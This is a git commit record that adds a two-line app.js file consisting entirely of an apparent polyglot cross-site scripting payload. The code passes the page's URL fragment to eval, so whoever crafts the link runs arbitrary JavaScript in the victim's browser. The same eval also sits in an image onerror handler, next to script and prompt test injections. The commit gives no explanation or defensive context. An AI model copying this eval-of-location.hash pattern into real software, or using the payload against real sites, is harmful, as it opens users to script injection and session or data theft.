1766ec74a2b88727b13744ec175f927df3b5e452
chunu67 <56378755+chunu67@users.noreply.github.com>
2020-12-24 00:57:35 +0530

    Create app.js

---
+++ app.js
@@ -0,0 +1,2 @@
+'';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}//<script>prompt(0)</script>//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
+msgbox+1
